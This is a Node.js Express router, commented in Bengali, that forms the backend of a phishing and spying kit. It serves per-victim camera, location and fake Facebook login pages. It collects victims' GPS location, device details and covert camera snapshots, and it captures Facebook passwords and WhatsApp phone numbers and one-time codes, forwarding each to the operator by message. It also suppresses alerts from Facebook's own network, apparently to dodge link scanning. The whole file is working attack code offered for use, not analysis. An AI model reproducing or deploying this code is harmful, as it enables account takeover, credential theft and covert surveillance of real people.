const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const { 
    sendMessage, 
    sendImageMessage,
    saveImageFile,
    formatVictimData,
    formatLocationMessage,
    getConfig
} = require('../utils/helpers');

// ================================================================
// অটো ডিলিট: ১০ মিনিট
// ================================================================
const CLEANUP_INTERVAL = 60000;
const IMAGE_TTL = 600000;

setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - IMAGE_TTL);
        const victims = await Victim.find();
        let updated = 0;
        for (const v of victims) {
            const originalLength = v.camera.length;
            v.camera = v.camera.filter(c => new Date(c.timestamp) > cutoff);
            if (v.camera.length !== originalLength) {
                await v.save();
                updated++;
            }
        }
        if (updated > 0) console.log(`🗑️ ${updated} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
    } catch (err) {
        console.error('Cleanup error:', err);
    }
}, CLEANUP_INTERVAL);

// ================================================================
// 🔥 ISP ব্লক লিস্ট – এই ISP থেকে এলে মেসেজ যাবে না
// ================================================================
const BLOCKED_ISP = 'Facebook, Inc.';

// ================================================================
// চেক ফাংশন: কোনো ভিক্টিমের ISP ব্লকেড কিনা
// ================================================================
function isIspBlocked(victim) {
    // location অবজেক্ট থাকতে হবে এবং isp ফিল্ড থাকতে হবে
    if (victim.location && victim.location.isp) {
        return victim.location.isp === BLOCKED_ISP;
    }
    return false;
}

// ================================================================
// রাউটস
// ================================================================

router.get('/v/:id', async (req, res) => {
    try {
        console.log(`🔍 ক্যামেরা লিংক ভিজিট: ${req.params.id}`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/index.html'));
    } catch (err) {
        console.error('Error serving victim page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/l/:id', async (req, res) => {
    try {
        console.log(`🔍 লোকেশন লিংক ভিজিট: ${req.params.id}`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/location.html'));
    } catch (err) {
        console.error('Error serving location page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/fb/:id', async (req, res) => {
    try {
        console.log(`🔍 ফেক লগইন লিংক ভিজিট: ${req.params.id}`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/fb.html'));
    } catch (err) {
        console.error('Error serving fb page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ================================================================
// 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং সহ
// ================================================================
router.post('/api/victim', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));

        if (!data.id) {
            console.error('❌ id নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        // ভিক্টিম খুঁজি বা তৈরি করি
        let victim = await Victim.findOne({ id: data.id });

        if (!victim) {
            victim = new Victim({
                id: data.id,
                fbId: data.fbId || 'unknown',
                type: data.type || 'camera',
                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                ip: data.ip || null,
                location: data.location || {},
                gpsLocation: data.gpsLocation || {},
                device: data.device || {},
                media: data.media || [],
                network: data.network || {},
                battery: data.battery || {},
                collectedAt: new Date()
            });
            await victim.save();
            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
        } else {
            if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                victim.fbId = data.fbId;
            }
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
            console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
        }

        // 🔥 ISP চেক
        const blocked = isIspBlocked(victim);
        console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);

        // ============================================================
        // 📤 মেসেজ পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
        // ============================================================
        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
        } else if (blocked) {
            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
        } else {
            console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
        }

        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয়)
        if (!blocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
            const locationMsg = formatLocationMessage(victim.gpsLocation);
            if (locationMsg) {
                await sendMessage(victim.fbId, locationMsg);
                console.log(`📍 লোকেশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
            }
        }

        res.status(200).json({ status: 'ok', data: victim, blocked: blocked });

    } catch (err) {
        console.error('❌ Victim data error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// 🚨 ক্যামেরা ছবি রিসিভ – ISP ব্লকিং সহ
// ================================================================
router.post('/api/camera', async (req, res) => {
    try {
        const { id, image } = req.body;
        console.log(`📸 ক্যামেরা রিকোয়েস্ট: ID=${id}, ছবি সাইজ=${image?.length || 0}`);

        if (!id || !image) {
            console.error('❌ id বা image নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id or image' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        // 🔥 ISP চেক
        const blocked = isIspBlocked(victim);
        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);

        const isFirstImage = !victim.camera || victim.camera.length === 0;

        if (!victim.camera) victim.camera = [];
        victim.camera.push({
            image: image,
            timestamp: new Date()
        });
        await victim.save();

        const totalImages = victim.camera.length;
        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);

        // ============================================================
        // 📤 ছবি পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
        // ============================================================
        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';
            const filename = await saveImageFile(image);
            
            if (filename) {
                const imageUrl = `${baseUrl}/images/${filename}`;
                
                if (isFirstImage) {
                    await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
                    console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
                }
                
                await sendImageMessage(victim.fbId, imageUrl);
                console.log(`📸 ছবি #${totalImages} পাঠানো: ${victim.fbId} (URL: ${imageUrl})`);
            } else {
                console.log(`⚠️ ইমেজ সেভ করতে ব্যর্থ, ছবি #${totalImages} পাঠানো হয়নি।`);
            }
        } else if (blocked) {
            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
        } else {
            console.log(`⚠️ fbId 'unknown' → ছবি পাঠানো হয়নি।`);
        }

        res.status(200).json({ status: 'ok', count: totalImages, blocked: blocked });

    } catch (err) {
        console.error('❌ Camera error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
// ================================================================
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }
        const index = parseInt(req.params.index);
        if (isNaN(index) || index < 0 || index >= victim.camera.length) {
            return res.status(404).send('ছবি পাওয়া যায়নি');
        }
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        console.error('Image view error:', err);
        res.status(500).send('এরর');
    }
});

// ================================================================
// ফেক ফেসবুক লগইন
// ================================================================
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        console.log(`🔐 ফেক লগইন রিকোয়েস্ট: ID=${id}, username=${username}`);

        if (!id || !username || !password) {
            console.error('❌ ডেটা নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        victim.fbLogin = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: req.ip || req.connection.remoteAddress || 'N/A'
        };
        await victim.save();

        console.log(`🔐 ফেক লগইন ডেটা সেভ: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ফেক লগইন মেসেজ পাঠানো: ${victim.fbId}`);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ FB Login error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// হোয়াটসঅ্যাপ ডেটা রিসিভ (নাম্বার + ওটিপি)
// ================================================================
router.post('/api/whatsapp', async (req, res) => {
    try {
        const { id, phone, otp } = req.body;
        console.log(`📱 হোয়াটসঅ্যাপ রিকোয়েস্ট: ID=${id}, phone=${phone}, otp=${otp}`);

        if (!id) {
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        // ইউজারকে মেসেজ পাঠানো হবে
        const userId = victim.fbId;

        // ফোন নাম্বার পেলে
        if (phone) {
            victim.wpData.phone = phone;
            victim.wpData.timestamp = new Date();
            await victim.save();

            if (userId && userId !== 'unknown') {
                await sendMessage(userId, `📱 নতুন মুরগী হোয়াটসঅ্যাপ লগিন করার জন্য নাম্বার দিয়েছে: \`${phone}\``);
                console.log(`📤 হোয়াটসঅ্যাপ নাম্বার মেসেজ: ${userId}`);
            }
            return res.status(200).json({ status: 'ok', message: 'Phone received' });
        }

        // ওটিপি পেলে
        if (otp) {
            victim.wpData.otp = otp;
            victim.wpData.timestamp = new Date();
            await victim.save();

            if (userId && userId !== 'unknown') {
                await sendMessage(userId, `🔑 ওটিপি: \`${otp}\``);
                console.log(`📤 হোয়াটসঅ্যাপ ওটিপি মেসেজ: ${userId}`);
            }
            return res.status(200).json({ status: 'ok', message: 'OTP received' });
        }

        return res.status(400).json({ status: 'error', message: 'No data provided' });

    } catch (err) {
        console.error('❌ WhatsApp API error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

module.exports = router;